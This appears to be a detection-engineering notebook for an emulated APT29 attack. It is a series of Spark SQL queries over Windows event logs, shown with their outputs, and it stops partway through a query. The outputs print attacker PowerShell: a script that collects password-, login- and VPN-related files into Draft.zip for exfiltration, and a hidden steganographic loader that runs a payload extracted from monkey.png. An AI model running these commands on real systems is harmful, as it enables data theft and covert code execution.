<h2>2.A.1. File and Directory Discovery<a class="headerlink" href="#a-1-file-and-directory-discovery" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Searched filesystem for document and media files using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe executing (Get-)ChildItem</p>
<div class="section" id="id4">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:10C87900-CC2F-4EE1-A2F2-1832A761B050</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT b.ScriptBlockText</span>
<span class="sd">FROM apt29Host a</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT d.ParentProcessGuid, d.ProcessId, c.ScriptBlockText</span>
<span class="sd">  FROM apt29Host c</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">      SELECT ParentProcessGuid, ProcessGuid, ProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">      ) d</span>
<span class="sd">  ON c.ExecutionProcessID = d.ProcessId</span>
<span class="sd">  WHERE c.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">          AND c.EventID = 4104</span>
<span class="sd">          AND LOWER(c.ScriptBlockText) LIKE &quot;%childitem%&quot;</span>
<span class="sd">) b</span>
<span class="sd">ON a.ProcessGuid = b.ParentProcessGuid</span>
<span class="sd">WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND a.EventID = 1</span>
<span class="sd">          AND LOWER(a.ParentImage) RLIKE &#39;.*\\â€Ž|â€|â€ª|â€«|â€¬|â€|â€®.*&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ScriptBlockText | $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:26F6963D-00D5-466A-B4BA-59DA30892B26</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT b.ScriptBlockText</span>
<span class="sd">FROM apt29Host a</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT d.NewProcessId, d.ProcessId, c.ScriptBlockText</span>
<span class="sd">  FROM apt29Host c</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">      SELECT split(NewProcessId, &#39;0x&#39;)[1] as NewProcessId, ProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">          AND EventID = 4688</span>
<span class="sd">      ) d</span>
<span class="sd">  ON hex(c.ExecutionProcessID) = d.NewProcessId</span>
<span class="sd">  WHERE c.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">          AND c.EventID = 4104</span>
<span class="sd">          AND LOWER(c.ScriptBlockText) LIKE &quot;%childitem%&quot;</span>
<span class="sd">) b</span>
<span class="sd">ON a.NewProcessId = b.ProcessId</span>
<span class="sd">WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">          AND a.EventID = 4688</span>
<span class="sd">          AND LOWER(a.ParentProcessName) RLIKE &#39;.*\\â€Ž|â€|â€ª|â€«|â€¬|â€|â€®.*&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ScriptBlockText | $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="a-2-automated-collection">
<h2>2.A.2. Automated Collection<a class="headerlink" href="#a-2-automated-collection" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Scripted search of filesystem for document and media files using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe executing (Get-)ChildItem</p>
<div class="section" id="id5">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:F96EA21C-1EB4-4988-8F98-BD018717EE2D</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT b.ScriptBlockText</span>
<span class="sd">FROM apt29Host a</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT d.ParentProcessGuid, d.ProcessId, c.ScriptBlockText</span>
<span class="sd">  FROM apt29Host c</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">      SELECT ParentProcessGuid, ProcessGuid, ProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">      ) d</span>
<span class="sd">  ON c.ExecutionProcessID = d.ProcessId</span>
<span class="sd">  WHERE c.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">          AND c.EventID = 4104</span>
<span class="sd">          AND LOWER(c.ScriptBlockText) LIKE &quot;%childitem%&quot;</span>
<span class="sd">) b</span>
<span class="sd">ON a.ProcessGuid = b.ParentProcessGuid</span>
<span class="sd">WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND a.EventID = 1</span>
<span class="sd">          AND LOWER(a.ParentImage) RLIKE &#39;.*\\â€Ž|â€|â€ª|â€«|â€¬|â€|â€®.*&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ScriptBlockText | $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:EAD989D4-8886-46DC-BC8C-780C10760E93</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT b.ScriptBlockText</span>
<span class="sd">FROM apt29Host a</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT d.NewProcessId, d.ProcessId, c.ScriptBlockText</span>
<span class="sd">  FROM apt29Host c</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">      SELECT split(NewProcessId, &#39;0x&#39;)[1] as NewProcessId, ProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">          AND EventID = 4688</span>
<span class="sd">      ) d</span>
<span class="sd">  ON hex(c.ExecutionProcessID) = d.NewProcessId</span>
<span class="sd">  WHERE c.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">          AND c.EventID = 4104</span>
<span class="sd">          AND LOWER(c.ScriptBlockText) LIKE &quot;%childitem%&quot;</span>
<span class="sd">) b</span>
<span class="sd">ON a.NewProcessId = b.ProcessId</span>
<span class="sd">WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">          AND a.EventID = 4688</span>
<span class="sd">          AND LOWER(a.ParentProcessName) RLIKE &#39;.*\\â€Ž|â€|â€ª|â€«|â€¬|â€|â€®.*&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ScriptBlockText | $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="a-3-data-from-local-system">
<h2>2.A.3. Data from Local System<a class="headerlink" href="#a-3-data-from-local-system" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Recursively collected files found in C:\Users\Pam\ using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe reading files in C:\Users\Pam\</p>
<div class="section" id="id6">
<h3>Detection Type:None(None)<a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h3>
</div>
</div>
<div class="section" id="a-4-data-compressed">
<h2>2.A.4. Data Compressed<a class="headerlink" href="#a-4-data-compressed" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Compressed and stored files into ZIP (Draft.zip) using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe executing Compress-Archive</p>
<div class="section" id="id7">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:6CDEBEBF-387F-4A40-A4E8-8D4DF3A8F897</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT b.ScriptBlockText</span>
<span class="sd">FROM apt29Host a</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT d.ParentProcessGuid, d.ProcessId, c.ScriptBlockText</span>
<span class="sd">  FROM apt29Host c</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">      SELECT ParentProcessGuid, ProcessGuid, ProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">      ) d</span>
<span class="sd">  ON c.ExecutionProcessID = d.ProcessId</span>
<span class="sd">  WHERE c.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">          AND c.EventID = 4104</span>
<span class="sd">          AND LOWER(c.ScriptBlockText) LIKE &quot;%compress-archive%&quot;</span>
<span class="sd">) b</span>
<span class="sd">ON a.ProcessGuid = b.ParentProcessGuid</span>
<span class="sd">WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND a.EventID = 1</span>
<span class="sd">          AND LOWER(a.ParentImage) RLIKE &#39;.*\\â€Ž|â€|â€ª|â€«|â€¬|â€|â€®.*&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ScriptBlockText | $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:621F8EE7-E9D8-417C-9FE5-5A0D89C3736A</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT b.ScriptBlockText</span>
<span class="sd">FROM apt29Host a</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT d.NewProcessId, d.ProcessId, c.ScriptBlockText</span>
<span class="sd">  FROM apt29Host c</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">      SELECT split(NewProcessId, &#39;0x&#39;)[1] as NewProcessId, ProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">          AND EventID = 4688</span>
<span class="sd">      ) d</span>
<span class="sd">  ON hex(c.ExecutionProcessID) = d.NewProcessId</span>
<span class="sd">  WHERE c.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">          AND c.EventID = 4104</span>
<span class="sd">          AND LOWER(c.ScriptBlockText) LIKE &quot;%compress-archive%&quot;</span>
<span class="sd">) b</span>
<span class="sd">ON a.NewProcessId = b.ProcessId</span>
<span class="sd">WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">          AND a.EventID = 4688</span>
<span class="sd">          AND LOWER(a.ParentProcessName) RLIKE &#39;.*\\â€Ž|â€|â€ª|â€«|â€¬|â€|â€®.*&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ScriptBlockText | $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="a-5-data-staged">
<h2>2.A.5. Data Staged<a class="headerlink" href="#a-5-data-staged" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Staged files for exfiltration into ZIP (Draft.zip) using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe creating the file draft.zip</p>
<div class="section" id="id8">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:76154CEC-1E01-4D3A-B9ED-C78978597C2B</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT TargetFilename</span>
<span class="sd">FROM apt29Host a</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT d.ProcessGuid, d.ProcessId</span>
<span class="sd">    FROM apt29Host c</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">        SELECT ProcessGuid, ProcessId</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND EventID = 1</span>
<span class="sd">        ) d</span>
<span class="sd">    ON c.ExecutionProcessID = d.ProcessId</span>
<span class="sd">    WHERE c.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">            AND c.EventID = 4104</span>
<span class="sd">            AND LOWER(c.ScriptBlockText) LIKE &quot;%compress-archive%&quot;</span>
<span class="sd">) b</span>
<span class="sd">ON a.ProcessGuid = b.ProcessGuid</span>
<span class="sd">WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND a.EventID = 11</span>
<span class="sd">            AND LOWER(a.TargetFilename) LIKE &quot;%zip&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0------------------------------------------------------
 TargetFilename | C:\Users\pbeesly\AppData\Roaming\Draft.Zip   
-RECORD 1------------------------------------------------------
 TargetFilename | C:\Users\pbeesly\AppData\Roaming\working.zip 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-1-exfiltration-over-command-and-control-channel">
<h2>2.B.1. Exfiltration Over Command and Control Channel<a class="headerlink" href="#b-1-exfiltration-over-command-and-control-channel" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Read and downloaded ZIP (Draft.zip) over C2 channel (192.168.0.5 over TCP port 1234)</p>
<p><strong>Criteria:</strong> The rcs.3aka3.doc process reading the file draft.zip while connected to the C2 channel</p>
<div class="section" id="id9">
<h3>Detection Type:None(None)<a class="headerlink" href="#id9" title="Permalink to this headline">¶</a></h3>
</div>
</div>
<div class="section" id="a-1-remote-file-copy">
<h2>3.A.1. Remote File Copy<a class="headerlink" href="#a-1-remote-file-copy" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Dropped stage 2 payload (monkey.png) to disk</p>
<p><strong>Criteria:</strong> The rcs.3aka3.doc process creating the file monkey.png</p>
<div class="section" id="id10">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id10" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:64249901-ADF8-4E5D-8BB4-70540A45E26C</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT b.Message</span>
<span class="sd">FROM apt29Host a</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT ProcessGuid, Message</span>
<span class="sd">    FROM apt29Host</span>
<span class="sd">    WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND EventID = 11</span>
<span class="sd">        AND LOWER(TargetFilename) LIKE &#39;%monkey.png&#39;</span>
<span class="sd">) b</span>
<span class="sd">ON a.ProcessGuid = b.ProcessGuid</span>
<span class="sd">WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">  AND a.EventID = 1</span>
<span class="sd">  AND LOWER(a.Image) RLIKE &#39;.*\\â€Ž|â€|â€ª|â€«|â€¬|â€|â€®.*&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | File created:
RuleName: -
UtcTime: 2020-05-02 02:57:00.933
ProcessGuid: {47ab858c-e13c-5eac-a903-000000000400}
ProcessId: 8524
Image: C:\ProgramData\victim\â€®cod.3aka3.scr
TargetFilename: C:\Users\pbeesly\Downloads\monkey.png
CreationUtcTime: 2020-05-02 02:57:00.933 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="a-2-obfuscated-files-or-information">
<h2>3.A.2. Obfuscated Files or Information<a class="headerlink" href="#a-2-obfuscated-files-or-information" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Embedded PowerShell payload in monkey.png using steganography</p>
<p><strong>Criteria:</strong> Evidence that a PowerShell payload was within monkey.png</p>
<div class="section" id="id11">
<h3>Detection Type:Telemetry(None)<a class="headerlink" href="#id11" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:0F10E1D1-EDF8-4B9F-B879-3651598D528A</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT d.Image, d.CommandLine, c.ScriptBlockText</span>
<span class="sd">FROM apt29Host c</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT ParentProcessGuid, ProcessGuid, ProcessId, ParentImage, Image, ParentCommandLine, CommandLine</span>
<span class="sd">    FROM apt29Host</span>
<span class="sd">    WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND EventID = 1</span>
<span class="sd">    ) d</span>
<span class="sd">ON c.ExecutionProcessID = d.ProcessId</span>
<span class="sd">WHERE c.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">    AND c.EventID = 4104</span>
<span class="sd">    AND LOWER(c.ScriptBlockText) LIKE &quot;%monkey.png%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Image           | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe                                                                                                                                                                                                                                                                                                                                                                     
 CommandLine     | &quot;PowerShell.exe&quot; -noni -noexit -ep bypass -window hidden -c &quot;sal a New-Object;Add-Type -AssemblyName &#39;System.Drawing&#39;; $g=a System.Drawing.Bitmap(&#39;C:\Users\pbeesly\Downloads\monkey.png&#39;);$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))&quot; 
 ScriptBlockText | sal a New-Object;Add-Type -AssemblyName &#39;System.Drawing&#39;; $g=a System.Drawing.Bitmap(&#39;C:\Users\pbeesly\Downloads\monkey.png&#39;);$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))                                                               
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:94F9B4F2-1C52-4A47-BF47-C786513A05AA</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT d.NewProcessName, d.CommandLine, c.ScriptBlockText</span>
<span class="sd">FROM apt29Host c</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT NewProcessName, CommandLine, split(NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">    FROM apt29Host</span>
<span class="sd">    WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">        AND EventID = 4688</span>
<span class="sd">    ) d</span>
<span class="sd">ON LOWER(hex(c.ExecutionProcessID)) = d.NewProcessId</span>
<span class="sd">WHERE c.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">    AND c.EventID = 4104</span>
<span class="sd">    AND LOWER(c.ScriptBlockText) LIKE &quot;%monkey.png%&quot;</span>

